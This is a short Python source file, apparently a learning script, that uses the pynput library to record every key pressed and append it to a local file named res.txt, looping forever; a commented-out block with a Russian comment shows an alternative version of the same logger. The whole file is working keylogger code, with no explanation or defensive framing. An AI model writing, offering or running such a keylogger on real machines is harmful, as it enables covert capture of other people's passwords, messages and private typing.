from pynput import keyboard


## В этом блоке будет работать слушатель событий.
# with keyboard.Events() as events:
#   for event in events:
#        if event.key:
#            with open('res.txt', 'a') as file:
#                print(f'{event.key}', file=file)

def on_press(key):
    with open('res.txt', 'a') as file:
        print(f'{key}', file=file)


listener = keyboard.Listener(
    on_press=on_press)
listener.start()
while True:
    pass
